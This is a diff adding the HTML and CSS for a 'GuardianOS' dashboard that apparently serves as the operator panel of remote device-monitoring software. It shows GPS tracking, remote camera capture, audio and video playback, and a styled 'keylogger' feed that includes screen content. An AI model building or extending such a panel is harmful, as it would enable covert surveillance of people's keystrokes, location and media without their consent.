@@ -1,0 +1,525 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GuardianOS - Multi-Device Command Center</title>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Rajdhani:wght@500;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="./multi-style.css">
+    <style>
+        /* ==========================================================================
+           INLINE LAYOUT STYLES (Sidebar + Main Grid)
+           ========================================================================== */
+        .dashboard-container {
+            position: relative;
+            z-index: 3;
+            display: flex;
+            min-height: calc(100vh - 70px);
+        }
+
+        /* ── Devices Sidebar ─────────────────────────── */
+        .devices-sidebar {
+            width: 280px;
+            min-width: 280px;
+            background: rgba(6, 9, 19, 0.92);
+            border-right: 1px solid var(--border-color);
+            backdrop-filter: blur(12px);
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+        }
+
+        .sidebar-header {
+            padding: 20px;
+            border-bottom: 1px solid var(--border-color);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .sidebar-header h3 {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 0.75rem;
+            letter-spacing: 2px;
+            color: var(--accent-glow);
+        }
+
+        .sidebar-header h3 i {
+            margin-right: 6px;
+            color: var(--primary-glow);
+        }
+
+        .device-badge {
+            background: var(--primary-glow);
+            color: var(--bg-color);
+            padding: 2px 10px;
+            border-radius: 10px;
+            font-family: 'Orbitron', monospace;
+            font-size: 11px;
+            font-weight: 700;
+        }
+
+        .devices-list {
+            flex: 1;
+            overflow-y: auto;
+            padding: 8px 0;
+        }
+
+        .sidebar-footer {
+            padding: 15px;
+            border-top: 1px solid var(--border-color);
+        }
+
+        .sidebar-action-btn {
+            width: 100%;
+            padding: 10px;
+            background: rgba(0, 242, 254, 0.08);
+            border: 1px solid var(--border-color);
+            color: var(--primary-glow);
+            border-radius: 6px;
+            cursor: pointer;
+            font-family: 'Rajdhani', sans-serif;
+            font-size: 12px;
+            font-weight: 700;
+            letter-spacing: 1px;
+            transition: all 0.3s ease;
+        }
+
+        .sidebar-action-btn:hover {
+            background: var(--primary-glow);
+            color: var(--bg-color);
+            box-shadow: 0 0 15px rgba(0, 242, 254, 0.3);
+        }
+
+        .sidebar-action-btn i {
+            margin-right: 6px;
+        }
+
+        /* ── Main Dashboard Area ─────────────────────── */
+        .dashboard-main {
+            flex: 1;
+            overflow-y: auto;
+            padding: 0;
+        }
+
+        /* ── Device Name Bar ─────────────────────────── */
+        .device-name-bar {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px 30px;
+            background: rgba(6, 9, 19, 0.6);
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        .device-name-bar h2 {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 1.2rem;
+            letter-spacing: 2px;
+            color: #fff;
+        }
+
+        .online-indicator {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 11px;
+            font-weight: 700;
+            letter-spacing: 2px;
+            color: var(--success-neon);
+        }
+
+        .pulse-dot-small {
+            width: 6px;
+            height: 6px;
+            background: var(--success-neon);
+            border-radius: 50%;
+            box-shadow: 0 0 8px var(--success-neon);
+            animation: cyber-pulse 2s infinite;
+        }
+
+        /* ── Alert Container ─────────────────────────── */
+        .alert-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 60vh;
+        }
+
+        .alert-message {
+            text-align: center;
+            color: var(--text-muted);
+        }
+
+        .alert-message i {
+            font-size: 3rem;
+            color: rgba(0, 242, 254, 0.3);
+            margin-bottom: 20px;
+            display: block;
+        }
+
+        .alert-message h3 {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 1.3rem;
+            letter-spacing: 2px;
+            color: var(--text-main);
+            margin-bottom: 10px;
+        }
+
+        .alert-message p {
+            font-size: 0.9rem;
+            max-width: 400px;
+        }
+
+        /* ── Full Width Card ─────────────────────────── */
+        .full-width {
+            grid-column: 1 / -1;
+        }
+
+        /* ── Battery Bar ─────────────────────────────── */
+        .battery-bar {
+            height: 4px;
+            background: linear-gradient(90deg, var(--success-neon), var(--primary-glow));
+            border-radius: 2px;
+            transition: width 0.5s ease;
+            margin-top: 6px;
+            box-shadow: 0 0 8px rgba(0, 255, 136, 0.3);
+        }
+
+        /* ── Brand in Header ─────────────────────────── */
+        .brand {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .brand i {
+            font-size: 1.5rem;
+        }
+
+        /* ── Control Matrix Card ─────────────────────── */
+        .control-matrix {
+            grid-column: 1 / -1;
+        }
+
+        /* ── Responsive: Collapse sidebar on mobile ──── */
+        @media (max-width: 768px) {
+            .dashboard-container {
+                flex-direction: column;
+            }
+
+            .devices-sidebar {
+                width: 100%;
+                min-width: unset;
+                max-height: 200px;
+                border-right: none;
+                border-bottom: 1px solid var(--border-color);
+            }
+
+            .devices-list {
+                display: flex;
+                overflow-x: auto;
+                overflow-y: hidden;
+                padding: 8px;
+                gap: 8px;
+            }
+
+            .device-item {
+                min-width: 200px;
+                border-bottom: none;
+                border: 1px solid rgba(255, 255, 255, 0.06);
+                border-radius: 8px;
+                flex-shrink: 0;
+            }
+
+            .device-name-bar {
+                padding: 15px 20px;
+            }
+
+            .device-name-bar h2 {
+                font-size: 0.9rem;
+            }
+        }
+
+        /* ==========================================================================
+           EXPANDED KEYLOGGER PANEL
+           ========================================================================== */
+        #keylog-feed {
+            max-height: 600px !important;
+            min-height: 300px !important;
+            overflow-y: auto !important;
+        }
+
+        #keylog-feed .feed-item {
+            padding: 8px 10px !important;
+            margin-bottom: 4px !important;
+            border-radius: 4px !important;
+        }
+
+        #keylog-feed .feed-item code {
+            font-size: 12px !important;
+            line-height: 1.5 !important;
+            white-space: pre-wrap !important;
+            word-break: break-all !important;
+            display: block !important;
+            max-height: 200px !important;
+            overflow-y: auto !important;
+            background: rgba(78, 205, 196, 0.05) !important;
+            padding: 4px 6px !important;
+            border-radius: 4px !important;
+        }
+
+        /* Screen content entries get more space */
+        #keylog-feed .feed-item[style*="a78bfa"] div[style*="pre-wrap"] {
+            max-height: 300px !important;
+            font-size: 11px !important;
+            line-height: 1.6 !important;
+        }
+
+        /* Make keylogger panel span 2 columns on wider screens */
+        @media (min-width: 769px) {
+            .data-panel:has(#keylog-feed) {
+                grid-column: span 2 !important;
+            }
+        }
+
+        /* Keylog scrollbar */
+        #keylog-feed::-webkit-scrollbar {
+            width: 6px;
+        }
+        #keylog-feed::-webkit-scrollbar-track {
+            background: #0a0a1a;
+        }
+        #keylog-feed::-webkit-scrollbar-thumb {
+            background: rgba(167, 139, 250, 0.3);
+            border-radius: 3px;
+        }
+        #keylog-feed::-webkit-scrollbar-thumb:hover {
+            background: rgba(167, 139, 250, 0.5);
+        }
+        
+        /* Loading Overlay */
+        #loading-overlay {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: var(--bg-color);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            color: var(--accent-glow);
+            font-size: 20px;
+            font-family: 'Orbitron', sans-serif;
+            letter-spacing: 2px;
+        }
+    </style>
+</head>
+<body class="dashboard-body">
+
+    <!-- Loading Screen -->
+    <div id="loading-overlay">
+        <div>
+            <i class="fa-solid fa-circle-notch fa-spin"></i> INITIALIZING GUARDIANOS...
+        </div>
+    </div>
+
+    <div class="background-grid"></div>
+    <div class="glowing-orb"></div>
+
+    <!-- ═══════════════════════════════════════════════ -->
+    <!-- HEADER                                          -->
+    <!-- ═══════════════════════════════════════════════ -->
+    <header class="dashboard-header">
+        <div class="brand">
+            <i class="fa-solid fa-shield-halved tech-glow"></i>
+            <h2>GUARDIAN<span class="accent-text">OS</span> NK</h2>
+        </div>
+        <div class="system-status-indicator">
+            <span class="pulse-dot"></span>
+            <span id="connection-status">LINK ESTABLISHED</span>
+        </div>
+        <button id="btn-logout" class="logout-btn">
+            <i class="fa-solid fa-power-off"></i> DISCONNECT
+        </button>
+    </header>
+
+    <!-- ═══════════════════════════════════════════════ -->
+    <!-- MAIN CONTAINER (Sidebar + Dashboard)            -->
+    <!-- ═══════════════════════════════════════════════ -->
+    <div class="dashboard-container">
+
+        <!-- ── DEVICES SIDEBAR ───────────────────────── -->
+        <aside class="devices-sidebar">
+            <div class="sidebar-header">
+                <h3><i class="fa-solid fa-mobile-screen-button"></i> DEVICES</h3>
+                <span id="device-count" class="device-badge">0</span>
+            </div>
+
+            <div id="devices-list" class="devices-list">
+                <!-- Device items injected by JS -->
+            </div>
+
+            <div class="sidebar-footer">
+                <button id="btn-refresh-devices" class="sidebar-action-btn">
+                    <i class="fa-solid fa-arrows-rotate"></i> Refresh Devices
+                </button>
+            </div>
+        </aside>
+
+        <!-- ── MAIN DASHBOARD ────────────────────────── -->
+        <main class="dashboard-main">
+
+            <!-- No Device Selected Alert -->
+            <div id="no-device-alert" class="alert-container" style="display: flex;">
+                <div class="alert-message">
+                    <i class="fa-solid fa-satellite-dish"></i>
+                    <h3>NO DEVICE SELECTED</h3>
+                    <p>Select a device from the sidebar to view telemetry and execute commands.</p>
+                </div>
+            </div>
+
+            <!-- Device Dashboard (Hidden until device selected) -->
+            <div id="device-dashboard" class="device-dashboard" style="display: none;">
+
+                <!-- Device Name Bar -->
+                <div class="device-name-bar">
+                    <h2 id="selected-device-name">Device</h2>
+                    <span id="device-online-status" class="online-indicator">
+                        <span class="pulse-dot-small"></span> ONLINE
+                    </span>
+                </div>
+
+                <!-- Dashboard Grid -->
+                <div class="dashboard-grid-container">
+
+                    <!-- ═══ SYSTEM METRICS ═══ -->
+                    <section class="crypto-card">
+                        <div class="card-header">
+                            <h3><i class="fa-solid fa-microchip"></i> SYSTEM METRICS</h3>
+                        </div>
+                        <div class="card-body">
+                            <div class="metric-item" style="flex-direction: column; align-items: stretch;">
+                                <div style="display: flex; justify-content: space-between; align-items: center;">
+                                    <span class="metric-label"><i class="fa-solid fa-battery-three-quarters"></i> BATTERY</span>
+                                    <span id="battery-text" class="metric-value">--%</span>
+                                </div>
+                                <div style="width: 100%; height: 4px; background: rgba(255,255,255,0.05); border-radius: 2px; margin-top: 8px; overflow: hidden;">
+                                    <div id="battery-bar" class="battery-bar" style="width: 0%;"></div>
+                                </div>
+                            </div>
+
+                            <div class="metric-item">
+                                <span class="metric-label"><i class="fa-solid fa-wifi"></i> NETWORK</span>
+                                <span id="network-text" class="metric-value" style="color: #00e5ff; font-size: 0.9rem;">UNKNOWN</span>
+                            </div>
+
+                            <div class="metric-item">
+                                <span class="metric-label"><i class="fa-solid fa-shield-halved"></i> STATE</span>
+                                <span id="device-state-text" class="metric-value status-secure">SECURE</span>
+                            </div>
+
+                            <div class="metric-item" style="flex-direction: column; align-items: flex-start; gap: 4px;">
+                                <span class="metric-label"><i class="fa-solid fa-clock"></i> LAST SEEN</span>
+                                <span id="last-seen-text" class="metric-value" style="font-size: 11px; color: #8a99ad; font-family: 'Rajdhani', monospace;">
+                                    --
+                                </span>
+                            </div>
+                        </div>
+                    </section>
+
+                    <!-- ═══ GPS TELEMETRY ═══ -->
+                    <section class="crypto-card">
+                        <div class="card-header">
+                            <h3><i class="fa-solid fa-location-crosshairs"></i> GPS TELEMETRY</h3>
+                        </div>
+                        <div class="card-body telemetry-layout">
+                            <div class="metric-item">
+                                <span class="metric-label">LATITUDE</span>
+                                <span id="latitude-text" class="metric-value data-stream">--</span>
+                            </div>
+                            <div class="metric-item">
+                                <span class="metric-label">LONGITUDE</span>
+                                <span id="longitude-text" class="metric-value data-stream">--</span>
+                            </div>
+                            <a id="map-link" href="#" target="_blank" class="cyber-action-btn">
+                                <i class="fa-solid fa-map-location-dot"></i> OPEN IN GOOGLE MAPS
+                            </a>
+                        </div>
+                    </section>
+
+                    <!-- ═══ ACTION EXECUTIVE MATRIX ═══ -->
+                    <section class="crypto-card control-matrix">
+                        <div class="card-header">
+                            <h3><i class="fa-solid fa-terminal"></i> COMMAND CENTER — REMOTE COMMANDS</h3>
+                        </div>
+                        <div class="card-grid">
+                            <button id="cmd-flashlight" class="matrix-btn toggle-btn">
+                                <i class="fa-solid fa-lightbulb"></i>
+                                <span>FLASHLIGHT</span>
+                                <span class="toggle-state">OFF</span>
+                            </button>
+                            <button id="cmd-alarm" class="matrix-btn toggle-btn">
+                                <i class="fa-solid fa-volume-high"></i>
+                                <span>ALARM</span>
+                                <span class="toggle-state">OFF</span>
+                            </button>
+                            <button id="cmd-lock" class="matrix-btn alert-action toggle-btn">
+                                <i class="fa-solid fa-lock"></i>
+                                <span>EMERGENCY LOCK</span>
+                                <span class="toggle-state">OFF</span>
+                            </button>
+                            <button id="cmd-capture" class="matrix-btn">
+                                <i class="fa-solid fa-camera"></i>
+                                <span>CAMERA</span>
+                                <span class="toggle-state">TRIGGER</span>
+                            </button>
+
+                            <!-- Advanced controls will be injected here by JS -->
+                            <div id="advanced-controls-injector"></div>
+                        </div>
+                    </section>
+
+                    <!-- ═══ REMOTE MEDIA MONITOR ═══ -->
+                    <section class="crypto-card full-width">
+                        <div class="card-header">
+                            <h3><i class="fa-solid fa-photo-film"></i> REMOTE MEDIA MONITOR</h3>
+                        </div>
+                        <div class="card-body" style="display: flex; flex-direction: column; height: 420px;">
+
+                            <div class="viewport-canvas-wrapper" style="position: relative; width: 100%; flex-grow: 1; background: #050510; border: 1px solid rgba(0, 242, 254, 0.1); border-radius: 6px; overflow: hidden; display: flex; align-items: center; justify-content: center;">
+
+                                <img id="cameraPreviewFrame" src="" alt="Live Feed"
+                                     style="display: none; max-width: 100%; max-height: 100%; object-fit: contain; position: relative; z-index: 10;" />
+
+                                <video id="mediaVideoPlayer" controls playsinline
+                                       style="display: none; max-width: 100%; max-height: 100%; object-fit: contain; position: relative; z-index: 10;"></video>
+
+                                <div id="audio-container" style="display: none; width: 90%; position: relative; z-index: 10; text-align: center;">
+                                    <div style="color: var(--primary-glow); font-size: 2rem; margin-bottom: 15px;">
+                                        <i class="fa-solid fa-wave-square"></i>
+                                    </div>
+                                    <audio id="mediaAudioPlayer" controls style="width: 100%;"></audio>
+                                </div>
+
+                                <div id="mediaPlaceholderText" class="placeholder-text" style="position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); z-index: 1;">
+                                    <i class="fa-solid fa-satellite-dish fa-beat" style="display: block; font-size: 2.5rem; color: var(--primary-glow); margin-bottom: 15px; opacity: 0.5;"></i>
+                                    AWAITING MEDIA DOWNLINK...
+                                </div>
+                            </div>
+
+                            <div id="captureTimestamp" class="timestamp-text">
+                                LAST UPDATED: NEVER
+                            </div>
+                        </div>
+                    </section>
+
+                </div>
+            </div>
+        </main>
+    </div>
+
+    <!-- JAVASCRIPT MODULES -->
+    <script type="module" src="./js/main.js"></script>
+</body>
+</html>
